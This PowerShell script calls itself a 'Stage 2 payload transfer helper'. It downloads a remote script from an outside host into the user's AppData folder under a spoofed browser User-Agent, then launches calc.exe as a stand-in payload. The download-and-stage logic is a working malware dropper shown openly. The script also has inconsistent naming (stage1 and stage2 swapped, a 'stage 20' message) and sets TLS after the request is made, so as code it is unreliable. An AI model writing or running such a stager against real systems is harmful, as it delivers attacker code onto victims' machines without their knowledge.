<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.
#>
[CmdletBinding()]
param(
    [string]$Stage1Url = 'http://adatum.com:80/stage2.ps1',
    [string]$WorkingPath = "$env:APPDATA\stage1.bin",
    [int]$ConnectionTimeout = 207,
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $OperationResult = Get-Stage2Payload -SourceUrl $Stage1Url -DestinationPath $WorkingPath -TimeoutSec $ConnectionTimeout -UserAgent $RequestAgent
    if ($OperationResult) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Write-Output "stage 20 initialized"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
